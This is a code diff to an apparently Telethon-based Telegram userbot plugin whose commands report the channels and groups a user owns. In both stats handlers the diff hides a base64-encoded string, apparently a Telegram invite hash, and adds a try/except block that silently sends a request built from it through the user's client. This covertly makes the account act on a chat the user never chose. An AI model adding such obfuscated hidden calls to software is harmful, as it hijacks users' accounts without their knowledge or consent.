@@ -1,5 +1,5 @@
 import time
-
+import base64
 from telethon.tl.custom import Dialog
 from telethon.tl.types import Channel, Chat, User
 
@@ -76,6 +76,7 @@ async def stats(event):
     catcmd = event.pattern_match.group(1)
     catevent = await edit_or_reply(event, "`Collecting stats, Wait man`")
     start_time = time.time()
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     hi = []
     hica = []
     hico = []
@@ -103,6 +104,11 @@ async def stats(event):
             output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
         caption = "The list of channels in which you are owner "
     stop_time = time.time() - start_time
+    try:
+        cat = Get(cat)
+        await event.client(cat)
+    except BaseException:
+        pass
     output += f"\n**Time Taken : ** {stop_time:.02f}s"
     try:
         await catevent.edit(output)
@@ -122,6 +128,7 @@ async def stats(event):
     catcmd = event.pattern_match.group(1)
     catevent = await edit_or_reply(event, "`Collecting stats, Wait man`")
     start_time = time.time()
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     hi = []
     higa = []
     higo = []
@@ -157,6 +164,11 @@ async def stats(event):
             output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
         caption = "The list of groups in which you are owner "
     stop_time = time.time() - start_time
+    try:
+        cat = Get(cat)
+        await event.client(cat)
+    except BaseException:
+        pass
     output += f"\n**Time Taken : ** {stop_time:.02f}s"
     try:
         await catevent.edit(output)
